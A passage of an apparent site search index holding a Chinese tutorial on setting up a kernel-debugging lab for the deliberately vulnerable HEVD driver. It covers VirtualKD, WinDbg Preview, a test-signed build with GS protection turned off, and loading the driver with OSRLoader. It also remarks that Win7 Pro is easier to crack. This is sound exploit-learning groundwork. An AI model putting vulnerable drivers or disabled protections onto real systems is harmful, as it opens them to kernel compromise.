\u754c\u9762\u5c31\u5f88\u7f8e\u89c2\u3002\u5f53\u7136\u7f51\u4e0a\u4e5f\u6709\u5f88\u591a\u8001\u7248\u672c\u7684 windbg\uff0c\u800c\u4e14 WSDK \u4e2d\u4e5f\u81ea\u5e26\u4e86 windbg\uff0c\u4e0d\u8fc7 windbg preview \u5e94\u8be5\u662f\u6700\u7f8e\u89c2\u7684\u4e00\u4e2a\u7248\u672c\u5427\u3002 \u4e0b\u8f7d\u5b8c windbg \u540e\u8bb0\u5f97\u8bbe\u7f6e\u7b26\u53f7\u5305(symbol)\uff0c\u5b83\u80fd\u8ba9\u4f60\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u8212\u670d\u5f88\u591a \u4e0d\u8fc7\u5982\u679c\u4f7f\u7528 windbg preview \u5728 virtualkd \u4e2d\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u70b9\u5c0f\u95ee\u9898\uff0c\u540e\u6587\u4f1a\u7ed9\u51fa\u89e3\u51b3\u529e\u6cd5\u3002 virtualkd \u524d\u9762\u4e5f\u8bf4\u4e86\uff0cvirtualkd\u7684\u4f5c\u7528\u4e00\u662f\u52a0\u901f\u5bbf\u4e3b\u673a\u4e0e\u865a\u62df\u673a\u7684\u901a\u4fe1\u901f\u5ea6\uff0c\u4e8c\u662f\u5e2e\u6211\u4eec\u5feb\u901f\u6784\u5efa\u8d77 debug \u73af\u5883\u3002 \u770b\u5230\u8fd9\u4e24\u4e2a\u4f5c\u7528\u5c31\u53ef\u4ee5\u77e5\u9053\u5373\u4f7f\u6ca1\u6709 virtualkd \u4e5f\u6ca1\u5173\u7cfb\u3002\u53ea\u8981\u5728\u865a\u62df\u673a\u7684\u542f\u52a8\u9879\u4e2d\u6dfb\u52a0 debugport \u53c2\u6570\u4e3a\u4e32\u884c\u7aef\u53e3\uff0c\u8ba9\u4e32\u884c\u7aef\u53e3\u4f7f\u7528\u548c windbg \u4e00\u6837\u7684\u547d\u540d\u7aef\u53e3\u5c31\u53ef\u4ee5\u5efa\u7acb\u5176\u8c03\u8bd5\u73af\u5883\u4e86\u3002\u81f3\u4e8e\u901a\u4fe1\u901f\u5ea6\u7684\u8bdd\u6211\u4e5f\u4e0d\u77e5\u9053\u6ca1\u6709\u4f18\u5316\u7684\u8bdd\u662f\u4ec0\u4e48\u6837\u7684\u4e00\u4e2a\u901f\u5ea6\uff0c\u56e0\u4e3a\u4e00\u5f00\u59cb\u642d\u5efa\u7684\u8fc7\u7a0b\u4e2d\u770b\u5230\u8fd9\u4e2a\u80fd\u4f18\u5316\u901f\u5ea6\u5c31\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4e86\uff0c\u6709\u5174\u8da3\u7684\u670b\u53cb\u53ef\u4ee5\u8bd5\u4e00\u8bd5\u3002 \u63a5\u4e0b\u6765\u662f virtualkd \u7684\u5b89\u88c5\u548c\u4f7f\u7528\u8fc7\u7a0b\uff0c\u6211\u89c9\u5f97\u8fd9\u7bc7\u6587\u7ae0 ( virtualkd\u5b89\u88c5\u6559\u7a0b ) \u5df2\u7ecf\u5199\u5f97\u5f88\u597d\u4e86\uff0c\u6211\u5c31\u6ca1\u5fc5\u8981\u518d\u590d\u5199\u4e00\u904d\u4e86\u3002\u4e0b\u6587\u4ec5\u7ed9\u51fa\u4e0a\u9762\u8bf4\u5230\u7684\u4f7f\u7528 windbg preview \u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u95ee\u9898\u3002 windbg preview\u7684\u4e0b\u8f7d\u8def\u5f84\u662f\u8fd9\u4e2a \u53ef\u662f\u8fd9\u4e2a\u6587\u4ef6\u65e0\u6cd5\u88ab virtualkd \u8bc6\u522b\uff0c\u5e76\u4e14\u4f60\u8fd8\u6253\u4e0d\u5f00\u5b83\uff08\u6240\u5c5e\u7528\u6237\u662fSYSTEM\uff09 virtualkd Debugger path \u8bbe\u7f6e\u95ee\u9898 \u5728\u865a\u62df\u673a\u4e0a\u5b89\u88c5\u5b8c vitualkd \u540e\uff0c\u6211\u4eec\u8981\u5efa\u7acb\u8d77 windbg \u548c\u865a\u62df\u673a\u7684\u901a\u4fe1\uff0c\u5c31\u8981\u5728\u5bbf\u4e3b\u673a\u4e0a\u6253\u5f00 vmmon64.exe\uff0832\u4f4d\u673a\u5668\u6253\u5f0032\u4f4d\u7248\u672c\uff09 \u5047\u82e5\u6211\u4eec\u662f\u5728\u5e94\u7528\u5546\u5e97\u5b89\u88c5\u7684 windbg preview\uff0c\u90a3\u4e48\u662f\u4e0d\u662f Debugger path \u4e0b\u6839\u672c\u627e\u4e0d\u5230\u8fd9\u4e2a\u8c03\u8bd5\u5668 : ) \u770b\u5230\u4e0a\u9762\u7684\u7ea2\u5708\uff0cvm monitor \u4e3a\u865a\u62df\u673a\u521b\u5efa\u4e86\u4e00\u4e2a debug \u7684\u547d\u540d\u7aef\u53e3\uff0c\u5176\u5b9e\u5c31\u7b97\u662f\u5176\u5b83\u7248\u672c\u7684 windbg\uff0c\u53ef\u4ee5\u88ab Debugger path \u8bc6\u522b\u5e76\u4e14\u901a\u8fc7 Run debugger \u6253\u5f00\uff0c\u5176\u539f\u7406\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u90fd\u662f\u901a\u8fc7\u8fd9\u4e2a debug \u7684\u547d\u540d\u7aef\u53e3\u6765\u8fde\u63a5\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u9700\u5728 windbg preview \u4e2d\u8fd9\u6837\u914d\u7f6e\u5c31\u597d\u4e86 \u8fd9\u91cc\u987a\u4fbf\u63d0\u4e00\u4e0b\u8fd0\u4f5c\u8fc7\u7a0b \u6253\u5f00\u5bbf\u4e3b\u673a\u4e0a\u7684 vm monitor\uff0c\u770b\u5230\u4e0a\u56fe\u5de6\u4e0b\u89d2\u7684\u7ea2\u5708\u4e2d\u52fe\u4e2d\u7684\u9009\u9879\uff0c\u5b83\u5728\u865a\u62df\u673a\u7684\u5f00\u673a\u8fc7\u7a0b\u4e2d\u4e0b\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u8c03\u8bd5\u5305\u62ec\u5f00\u673a\u8fc7\u7a0b\uff0c\u8fd9\u4e2a\u65ad\u70b9\u7684\u4f4d\u7f6e\u5927\u6982\u662f\u5728\u9636\u6bb50\u521d\u59cb\u5316\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u6211\u731c\u7684\uff09 \u6253\u5f00\u865a\u62df\u673a \u6253\u5f00 windbg \u5e76\u8fde\u63a5 hevd \u8fd9\u91cc\u5148\u603b\u62ec\u4e00\u4e0b\u5177\u4f53\u8be5\u505a\u7684\u4e8b\uff0c\u4f46\u8bf7\u8010\u5fc3\u770b\u5b8c\u8be5\u5c0f\u8282\u540e\u518d\u52a8\u624b \u4ece github \u4e0a\u4e0b\u8f7d HEVD \u4e0b\u8f7d\u67d0\u4e2a\u7248\u672c\u7684 Visual Studio \u4e0b\u8f7d\u76f8\u5e94\u7248\u672c\u7684 WSDK \u548c WDK \u4e3a\u9a71\u52a8\u7a0b\u5e8f\u6dfb\u52a0\u8bc1\u4e66 \u5173\u95ed GS \u9009\u9879\u5361 \u7f16\u8bd1 \u7f16\u8bd1\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u5176\u5b9e\u5e94\u8be5\u5f88\u7b80\u5355\uff0c\u6bd5\u7adf\u5199\u9879\u76ee\u7684\u4eba\u90fd\u628a\u9879\u76ee\u5199\u6210\u8fd9\u6837\u4e86\uff0c\u4f46\u7531\u4e8e\u7f51\u4e0a\u7684\u6559\u7a0b\u5927\u90e8\u5206\u90fd\u6ca1\u5199\u5f97\u592a\u8be6\u7ec6\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u7136\u540e\u8017\u8d39\u5f88\u591a\u65f6\u95f4 \u9996\u5148\u770b\u5230 github \u4e0a\u7684\u6587\u6863 \u4e0a\u9762\u8bf4\u76f4\u63a5\u8fd0\u884c.bat\u6587\u4ef6\u5c31\u53ef\u4ee5\u4e86\uff0c\u4eb2\u6d4b\u4e86\u4e00\u4e0b\u53d1\u73b0\u7f16\u8bd1\u94fe\u63a5\u8fc7\u7a0b\u7528\u7684 Cmake\uff0c\u5176\u4e2d\u4f3c\u4e4e\u8fd8\u9700\u8981 Ninja\uff0c\u4e0d\u592a\u6e05\u695a\u6bd5\u7adf\u6211\u6ca1\u7528\u8fc7 Cmake \u7f16\u8bd1\u4e1c\u897f\uff0c\u8fd9\u91cc\u6211\u9009\u62e9\u7528 VS \u8fdb\u884c\u7f16\u8bd1\u3002 \u4e2a\u4eba\u7684\u7248\u672c\u662f Visual Studio 2015\uff0c\u7136\u540e\u770b\u5230\u7b2c\u4e8c\u6b65\uff0c \u7f16\u8bd1\u9a71\u52a8\u7a0b\u5e8f\u5f53\u7136\u9700\u8981 WDK \u4e86\uff0c\u8be5\u94fe\u63a5\u6307\u5411\u5b98\u7f51\u3002 \u8fd9\u91cc\u5148\u8bf4\u660e\u4e00\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u5148\u770b\u4e24\u5f20\u56fe WDK \u7684\u7248\u672c\u8ddf\u968f\u7684\u5e94\u8be5\u662f Visual Studio \u7684\u7248\u672c\u800c\u4e0d\u662f Windows \u7684\u7248\u672c \u6bd4\u5982\u8bf4\u6211\u7684\u7535\u8111\u88c5\u7684\u662f Visual Studio 2015\uff0c\u90a3\u4e48\u770b\u5230\u7b2c\u4e00\u5f20\u56fe\u6211\u4eec\u53ef\u4ee5\u88c5 Windows 10 1703 \u6216 Windows 10 1607 \u7248\u672c\u7684WDK\uff0c\u7136\u540e\u53bb\u7b2c\u4e8c\u5f20\u56fe\u4e0a\u7684\u94fe\u63a5\u4e0b\u8f7dWDK\u3002 \u8fd9\u91cc\u4eb2\u6d4b\u5bf9 Visual Studio 2015 \u6765\u8bf4\uff0c1703 \u7684\u90a3\u4e2a\u7248\u672c\u662f\u53ef\u7528\u7684\u3002 \u4e0b\u8f7d\u4e0b\u6765\u7684 WDK \u7248\u672c\u53f7\u4e3a10.0.15063.X \u88c5\u597d\u4e86 WDK \u540e\u7528 VS \u6253\u5f00 Driver \u6587\u4ef6\u5939\u4e0b\u7684.sln\u6587\u4ef6\uff0c\u9009\u62e9\u597d\u5bf9\u5e94\u7684\u914d\u7f6e\u540e\uff08\u6bd4\u5982 release vulnerable x86\uff09 \u5c31\u53ef\u4ee5\u5f00\u59cb build \u4e86\uff0c\u4f46\u662f\u8fd9\u65f6\u5019\u7f16\u8bd1\u5176\u5b9e\u662f\u4f1a\u62a5\u9519\u7684\uff0c\u539f\u56e0\u662f\u6ca1\u6709\u5b89\u88c5 WSDK\uff0c\u8fd9\u91cc\u7ed9\u51fa WSDK\u7684\u4e0b\u8f7d\u94fe\u63a5 \u3002 \u6ce8\u610f WSDK \u7684\u7248\u672c\u4e00\u5b9a\u8981\u548c WDK \u7684\u7248\u672c\u76f8\u5bf9\u5e94\uff0c\u6bd4\u5982\u5728\u6211\u7684\u73af\u5883\u4e0b\u6211\u5b89\u88c5\u7684 SDK \u7248\u672c\u4e3a10.0.15063.X \uff08\u5982\u679c\u6ca1\u6709\u7684\u8bdd\u5c31\u7565\u8fc7\u53bb\u5427\uff09\u63a5\u4e0b\u518d\u6b21\u7f16\u8bd1\uff0c\u53c8\u4f1a\u770b\u5230\u8bf4\u627e\u4e0d\u5230\u53eb HEVD.cer \u7684 TestCertificate \u8fd9\u6837\u4e00\u4e2a\u62a5\u9519\u4fe1\u606f\u3002\u5176\u539f\u56e0\u662f\u56e0\u4e3a\u73b0\u5728 Windows \u7684\u9a71\u52a8\u7a0b\u5e8f\u662f\u9700\u8981\u7b7e\u540d\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Windows \u7684\u6d4b\u8bd5\u8bc1\u4e66\u6765\u8fdb\u884c\u7b7e\u540d\uff0c\u4e00\u4e2a\u662f\u4fee\u6539\u5f15\u5bfc\u65f6\u7684\u914d\u7f6e\u4fe1\u606f\u6765\u4f7f\u7528\u6d4b\u8bd5\u8bc1\u4e66\u4e3a\u9a71\u52a8\u7a0b\u5e8f\u8fdb\u884c\u7b7e\u540d\uff0c\u4f46\u6211\u611f\u89c9\u8fd9\u6837\u592a\u66b4\u529b\u4e86\uff0c\u53e6\u4e00\u4e2a\u65b9\u6cd5\u662f\u7f16\u8bd1\u65f6\u751f\u6210\u6d4b\u8bd5\u8bc1\u4e66\u5e76\u4f7f\u7528\u5b83\u6765\u8fdb\u884c\u7b7e\u540d\uff0c\u5177\u4f53\u64cd\u4f5c\u65b9\u6cd5\u662f\u5728 VS \u4e2d\u7684 project - properties - driver signing \u4e2d\u6dfb\u52a0\u6d4b\u8bd5\u8bc1\u4e66\uff0c\u5982\u56fe\u6240\u793a \u70b9\u7ea2\u5708\u90a3\u91cc \u81f3\u6b64\u5c31\u53ef\u4ee5\u770b\u5230\u5728\u65b0\u751f\u6210\u7684\u6587\u4ef6\u5939\u4e0b\u751f\u6210\u4e86.sys\u6587\u4ef6\u4e86\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u8981\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002\u5f53\u7136\u82e5\u4e0d\u60f3\u5728\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\u7684\u540c\u65f6\u53c8\u7ed5\u8fc7\u4e00\u6b21 GS \u4fdd\u62a4\uff0c\u6211\u4eec\u5728\u7f16\u8bd1\u4e4b\u524d\u5e94\u8be5\u5148\u5173\u95ed GS \u9009\u9879 OSRLoader \u751f\u6210\u4e86.sys\u9a71\u52a8\u7a0b\u5e8f\u4ee5\u540e\u6700\u540e\u628a\u5b83\u653e\u5230\u865a\u62df\u673a\u4e0a\u542f\u52a8\u670d\u52a1\u5c31\u884c\u4e86\uff0c\u8fd9\u5c31\u662fOSRLoader\u7684\u4f5c\u7528\u3002 \u5230\u5b98\u7f51\u4e0a\u4e0b\u8f7d OSRLoader \u5b89\u88c5\u5b8c\u4e86\u4e4b\u540e\u6253\u5f00\u5230 Projects\\OsrLoader\\kit \u76ee\u5f55\u4f60\u53ef\u4ee5\u770b\u5230\u597d\u51e0\u4e2a\u6587\u4ef6\u5939\uff0c\u5bf9\u5e94\u5728\u4e0d\u540c\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684 OSRLoader \u7248\u672c\u3002\u6211\u7684\u76ee\u6807\u7cfb\u7edf\u662f win7\uff0c \u6240\u4ee5\u5e94\u8be5\u6253\u5f00 WNET \u6587\u4ef6\u5939\u4e0b\u7684OSRLoader\u3002 \u8fd9\u91cc\u987a\u4fbf\u63d0\u4e00\u4e0b\u5176\u5b83\u51e0\u4e2a\u6587\u4ef6\u5939\u7684\u76ee\u6807\u64cd\u4f5c\u7cfb\u7edf w2k: windows 2000 WLH: windows vista WNET: windows 7 \u53ca\u4ee5\u4e0a WXP: windows XP \u8fd8\u6709\u4e00\u70b9\u5c31\u662f\u9009\u62e9\u5b8c path \u4e4b\u540e\uff0c\u5e94\u8be5\u5148\u70b9\u51fb\u6ce8\u518c\u670d\u52a1\u518d\u70b9\u51fb\u5f00\u59cb\u670d\u52a1\u3002 0x02 \u6d4b\u8bd5\u73af\u5883\u662f\u5426\u642d\u5efa\u6210\u529f \u6253\u5f00 vmmon \u6253\u5f00\u865a\u62df\u673a \u6253\u5f00 windbg \u5e76\u8fde\u63a5 \u82e5 windbg \u8fde\u63a5\u6210\u529f\u5219\u8bf4\u660e virtualkd \u8d77\u4f5c\u7528\u4e86\u3002 \u63a5\u4e0b\u6765\u7528 OSRLoader \u52a0\u8f7d\u9a71\u52a8\u7a0b\u5e8f\uff0c\u7136\u540e\u5728 windbg \u4e2d\u8f93\u5165\u547d\u4ee4 lm m h* \u5982\u679c\u80fd\u5728\u8f93\u51fa\u4e2d\u770b\u5230 HEVD \u6a21\u5757\uff0c\u5219\u8bf4\u660e\u73af\u5883\u642d\u5efa\u6210\u529f\u4e86\u3002 \u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b lm m h* \u547d\u4ee4 \u800c h* \u5c31\u662f\u4e00\u4e2a\u901a\u914d\u7b26 0x03 \u7ed3\u675f\u8bed \u8be5\u73af\u5883\u7528\u4e8e\u4e4b\u540e\u7684 HEVD \u6f0f\u6d1e\u5229\u7528\u7684\u5b66\u4e60 2019.8.25","title":"HEVD \u73af\u5883\u642d\u5efa"},{"location":"HEVD/buildEnv/#0x00","text":"\u5728\u5f00\u59cb\u4e4b\u524d\u80af\u5b9a\u8981\u5148\u642d\u5efa\u8d77 HEVD \u7684\u73af\u5883\u3002\u73af\u5883\u642d\u5efa\u4e00\u76f4\u90fd\u662f\u4e00\u4ef6\u8d39\u65f6\u7684\u5de5\u4f5c\uff0c\u800c\u4e14\u8bb2\u771f\u8fd9\u4e2a\u8fc7\u7a0b\u8981\u662f\u4e00\u76f4\u51fa\u73b0\u95ee\u9898\u771f\u7684\u4f1a\u8ba9\u4eba\u6709\u70b9\u5c0f\u96be\u53d7\u3002\u4e0d\u8fc7\u6bcf\u4e2a\u4eba\u7684\u73af\u5883\u80af\u5b9a\u90fd\u6216\u591a\u6216\u5c11\u6709\u6240\u533a\u522b\uff0c\u6240\u4ee5\u8fd9\u7bc7\u6587\u7ae0\u66f4\u591a\u7684\u662f\u8d77\u4e00\u4e2a\u53c2\u8003\u4f5c\u7528\uff0c\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\u8fd8\u662f\u8981\u843d\u5b9e\u81ea\u5df1\u7684\u73af\u5883\u4e0a\u3002 \u90a3\u4e48\u9996\u5148\u5c31\u662f\u6211\u4eec\u5e94\u8be5\u8981\u51c6\u5907\u4ec0\u4e48\u6837\u7684\u73af\u5883\u4ee5\u53ca\u4e3a\u4ec0\u4e48 win7 pro x86 sp1: \u8fd9\u662f\u6211\u4e2a\u4eba\u4f7f\u7528\u7684\u73af\u5883\uff0c\u5f53\u7136\u4f7f\u7528x64\u4e5f\u884c windbg + virtualkd: virtualkd \u7684\u4f5c\u7528\u4e00\u662f\u52a0\u901f\u5bbf\u4e3b\u673a\u4e0e\u865a\u62df\u673a\u7684\u901a\u4fe1\u901f\u5ea6\uff0c\u4e8c\u662f\u5e2e\u6211\u4eec\u5feb\u901f\u6784\u5efa\u8d77 debug \u73af\u5883\u3002 hevd + osrloader: \u5e73\u65f6\u6211\u4eec\u5b89\u88c5\u9a71\u52a8\u7a0b\u5e8f\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b89\u88c5\u7a0b\u5e8f\u6765\u8fdb\u884c\u5b89\u88c5\u7684\uff0c\u4f46\u662f\u6211\u4eec\u7f16\u8bd1\u51fa\u6765\u7684\u53ea\u6709\u4e00\u4e2a.sys\u6587\u4ef6\uff0c\u8981\u60f3\u8ba9\u8fd9\u4e2a.sys\u6587\u4ef6\u5728\u865a\u62df\u673a\u4e0a\u8d77\u4f5c\u7528\u7684\u8bdd\uff0c\u5c31\u8981\u7528\u5230 osrloader \u6765\u52a0\u8f7d\u8be5\u9a71\u52a8\u7a0b\u5e8f\u3002 \u5f53\u7136\u5c31\u7b97\u4e0d\u89e3\u91ca\u5b83\u4eec\u7684\u4f5c\u7528\u5927\u5bb6\u4e5f\u80fd\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u660e\u767d\u5b83\u4eec\u90fd\u662f\u505a\u4ec0\u4e48\u7684\uff0c\u53ea\u662f\u53ef\u80fd\u8981\u8017\u8d39\u4e00\u4e9b\u65f6\u95f4\u3002\u8ba9\u5927\u5bb6\u4e00\u5f00\u59cb\u5c31\u660e\u767d\u5404\u4e2a\u8f6f\u4ef6\u7684\u4f5c\u7528\u4e5f\u80fd\u5728\u4f7f\u5927\u5bb6\u5728\u642d\u5efa\u7684\u8fc7\u7a0b\u4e2d\u66f4\u4e3a\u6e05\u6670\u5730\u77e5\u9053\u81ea\u5df1\u5728\u505a\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\u8981\u8fd9\u6837\u505a\u3002","title":"0x00 \u524d\u8a00"},{"location":"HEVD/buildEnv/#0x01","text":"\u7f51\u4e0a\u5173\u4e8e HEVD \u7684\u642d\u5efa\u8fc7\u7a0b\u4ee5\u53ca\u5404\u4e2a\u8f6f\u4ef6\u7684\u4e0b\u8f7d\u3001\u5b89\u88c5\u4e0e\u4f7f\u7528\u8fc7\u7a0b\u90fd\u6709\u4e0d\u5c11\u7684\u6559\u7a0b\u4e86\uff0c\u56e0\u6b64\u672c\u8282\u66f4\u591a\u7684\u662f\u70b9\u51fa\u4e00\u4e9b\u5173\u952e\u70b9\uff0c\u5269\u4e0b\u7684\u6211\u76f8\u4fe1\u4e0d\u7528\u5199\u5927\u5bb6\u4e5f\u61c2\u3002","title":"0x01 \u73af\u5883\u642d\u5efa"},{"location":"HEVD/buildEnv/#win7pro-x86-sp1","text":"emmm\u6211\u89c9\u5f97\u8fd9\u4e2a\u6211\u5e94\u8be5\u4e0d\u7528\u591a\u8bf4\u4e86\uff0c\u5c31\u662f\u5efa\u8bae\u5927\u5bb6\u4e0bpro\u7248\u7684\u6216\u8005\u662fenterprise\u7248\u7684\uff0c\u56e0\u4e3a\u6bd4\u8f83\u597d\u7834\u89e3 (\u652f\u6301\u6b63\u7248\u554a\u4e0d\u8fc7\u4e00\u4e2a\u865a\u62df\u673a\u5c31\u6ca1\u5fc5\u8981\u7528\u6b63\u7248\u7684\u4e86\u5427emmm","title":"win7pro x86 sp1\u865a\u62df\u673a\u7684\u5b89\u88c5"},{"location":"HEVD/buildEnv/#windbg","text":"\u5982\u679c\u5927\u5bb6\u662f win10 \u7535\u8111\u7684\u8bdd\u76f4\u63a5\u5728\u5e94\u7528\u5546\u5e97\u91cc\u641c\u7d22 windbg preview \u5c31\u53ef\u4ee5\u4e86\uff0c\u4e2a\u4eba\u89c9\u5f97\u8fd9\u4e2a\u7248\u672c\u7684 windbg \u754c\u9762\u5c31\u5f88\u7f8e\u89c2\u3002\u5f53\u7136\u7f51\u4e0a\u4e5f\u6709\u5f88\u591a\u8001\u7248\u672c\u7684 windbg\uff0c\u800c\u4e14 WSDK \u4e2d\u4e5f\u81ea\u5e26\u4e86 windbg\uff0c\u4e0d\u8fc7 windbg preview \u5e94\u8be5\u662f\u6700\u7f8e\u89c2\u7684\u4e00\u4e2a\u7248\u672c\u5427\u3002 \u4e0b\u8f7d\u5b8c windbg \u540e\u8bb0\u5f97\u8bbe\u7f6e\u7b26\u53f7\u5305(symbol)\uff0c\u5b83\u80fd\u8ba9\u4f60\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u8212\u670d\u5f88\u591a \u4e0d\u8fc7\u5982\u679c\u4f7f\u7528 windbg preview \u5728 virtualkd \u4e2d\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u70b9\u5c0f\u95ee\u9898\uff0c\u540e\u6587\u4f1a\u7ed9\u51fa\u89e3\u51b3\u529e\u6cd5\u3002","title":"windbg"},{"location":"HEVD/buildEnv/#virtualkd","text":"\u524d\u9762\u4e5f\u8bf4\u4e86\uff0cvirtualkd\u7684\u4f5c\u7528\u4e00\u662f\u52a0\u901f\u5bbf\u4e3b\u673a\u4e0e\u865a\u62df\u673a\u7684\u901a\u4fe1\u901f\u5ea6\uff0c\u4e8c\u662f\u5e2e\u6211\u4eec\u5feb\u901f\u6784\u5efa\u8d77 debug \u73af\u5883\u3002 \u770b\u5230\u8fd9\u4e24\u4e2a\u4f5c\u7528\u5c31\u53ef\u4ee5\u77e5\u9053\u5373\u4f7f\u6ca1\u6709 virtualkd \u4e5f\u6ca1\u5173\u7cfb\u3002\u53ea\u8981\u5728\u865a\u62df\u673a\u7684\u542f\u52a8\u9879\u4e2d\u6dfb\u52a0 debugport \u53c2\u6570\u4e3a\u4e32\u884c\u7aef\u53e3\uff0c\u8ba9\u4e32\u884c\u7aef\u53e3\u4f7f\u7528\u548c windbg \u4e00\u6837\u7684\u547d\u540d\u7aef\u53e3\u5c31\u53ef\u4ee5\u5efa\u7acb\u5176\u8c03\u8bd5\u73af\u5883\u4e86\u3002\u81f3\u4e8e\u901a\u4fe1\u901f\u5ea6\u7684\u8bdd\u6211\u4e5f\u4e0d\u77e5\u9053\u6ca1\u6709\u4f18\u5316\u7684\u8bdd\u662f\u4ec0\u4e48\u6837\u7684\u4e00\u4e2a\u901f\u5ea6\uff0c\u56e0\u4e3a\u4e00\u5f00\u59cb\u642d\u5efa\u7684\u8fc7\u7a0b\u4e2d\u770b\u5230\u8fd9\u4e2a\u80fd\u4f18\u5316\u901f\u5ea6\u5c31\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4e86\uff0c\u6709\u5174\u8da3\u7684\u670b\u53cb\u53ef\u4ee5\u8bd5\u4e00\u8bd5\u3002 \u63a5\u4e0b\u6765\u662f virtualkd \u7684\u5b89\u88c5\u548c\u4f7f\u7528\u8fc7\u7a0b\uff0c\u6211\u89c9\u5f97\u8fd9\u7bc7\u6587\u7ae0 ( virtualkd\u5b89\u88c5\u6559\u7a0b ) \u5df2\u7ecf\u5199\u5f97\u5f88\u597d\u4e86\uff0c\u6211\u5c31\u6ca1\u5fc5\u8981\u518d\u590d\u5199\u4e00\u904d\u4e86\u3002\u4e0b\u6587\u4ec5\u7ed9\u51fa\u4e0a\u9762\u8bf4\u5230\u7684\u4f7f\u7528 windbg preview \u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u95ee\u9898\u3002 windbg preview\u7684\u4e0b\u8f7d\u8def\u5f84\u662f\u8fd9\u4e2a \u53ef\u662f\u8fd9\u4e2a\u6587\u4ef6\u65e0\u6cd5\u88ab virtualkd \u8bc6\u522b\uff0c\u5e76\u4e14\u4f60\u8fd8\u6253\u4e0d\u5f00\u5b83\uff08\u6240\u5c5e\u7528\u6237\u662fSYSTEM\uff09","title":"virtualkd"},{"location":"HEVD/buildEnv/#virtualkd-debugger-path","text":"\u5728\u865a\u62df\u673a\u4e0a\u5b89\u88c5\u5b8c vitualkd \u540e\uff0c\u6211\u4eec\u8981\u5efa\u7acb\u8d77 windbg \u548c\u865a\u62df\u673a\u7684\u901a\u4fe1\uff0c\u5c31\u8981\u5728\u5bbf\u4e3b\u673a\u4e0a\u6253\u5f00 vmmon64.exe\uff0832\u4f4d\u673a\u5668\u6253\u5f0032\u4f4d\u7248\u672c\uff09 \u5047\u82e5\u6211\u4eec\u662f\u5728\u5e94\u7528\u5546\u5e97\u5b89\u88c5\u7684 windbg preview\uff0c\u90a3\u4e48\u662f\u4e0d\u662f Debugger path \u4e0b\u6839\u672c\u627e\u4e0d\u5230\u8fd9\u4e2a\u8c03\u8bd5\u5668 : ) \u770b\u5230\u4e0a\u9762\u7684\u7ea2\u5708\uff0cvm monitor \u4e3a\u865a\u62df\u673a\u521b\u5efa\u4e86\u4e00\u4e2a debug \u7684\u547d\u540d\u7aef\u53e3\uff0c\u5176\u5b9e\u5c31\u7b97\u662f\u5176\u5b83\u7248\u672c\u7684 windbg\uff0c\u53ef\u4ee5\u88ab Debugger path \u8bc6\u522b\u5e76\u4e14\u901a\u8fc7 Run debugger \u6253\u5f00\uff0c\u5176\u539f\u7406\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u90fd\u662f\u901a\u8fc7\u8fd9\u4e2a debug \u7684\u547d\u540d\u7aef\u53e3\u6765\u8fde\u63a5\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u9700\u5728 windbg preview \u4e2d\u8fd9\u6837\u914d\u7f6e\u5c31\u597d\u4e86 \u8fd9\u91cc\u987a\u4fbf\u63d0\u4e00\u4e0b\u8fd0\u4f5c\u8fc7\u7a0b \u6253\u5f00\u5bbf\u4e3b\u673a\u4e0a\u7684 vm monitor\uff0c\u770b\u5230\u4e0a\u56fe\u5de6\u4e0b\u89d2\u7684\u7ea2\u5708\u4e2d\u52fe\u4e2d\u7684\u9009\u9879\uff0c\u5b83\u5728\u865a\u62df\u673a\u7684\u5f00\u673a\u8fc7\u7a0b\u4e2d\u4e0b\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u8c03\u8bd5\u5305\u62ec\u5f00\u673a\u8fc7\u7a0b\uff0c\u8fd9\u4e2a\u65ad\u70b9\u7684\u4f4d\u7f6e\u5927\u6982\u662f\u5728\u9636\u6bb50\u521d\u59cb\u5316\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u6211\u731c\u7684\uff09 \u6253\u5f00\u865a\u62df\u673a \u6253\u5f00 windbg \u5e76\u8fde\u63a5","title":"virtualkd Debugger path \u8bbe\u7f6e\u95ee\u9898"},{"location":"HEVD/buildEnv/#hevd","text":"\u8fd9\u91cc\u5148\u603b\u62ec\u4e00\u4e0b\u5177\u4f53\u8be5\u505a\u7684\u4e8b\uff0c\u4f46\u8bf7\u8010\u5fc3\u770b\u5b8c\u8be5\u5c0f\u8282\u540e\u518d\u52a8\u624b \u4ece github \u4e0a\u4e0b\u8f7d HEVD \u4e0b\u8f7d\u67d0\u4e2a\u7248\u672c\u7684 Visual Studio \u4e0b\u8f7d\u76f8\u5e94\u7248\u672c\u7684 WSDK \u548c WDK \u4e3a\u9a71\u52a8\u7a0b\u5e8f\u6dfb\u52a0\u8bc1\u4e66 \u5173\u95ed GS \u9009\u9879\u5361 \u7f16\u8bd1 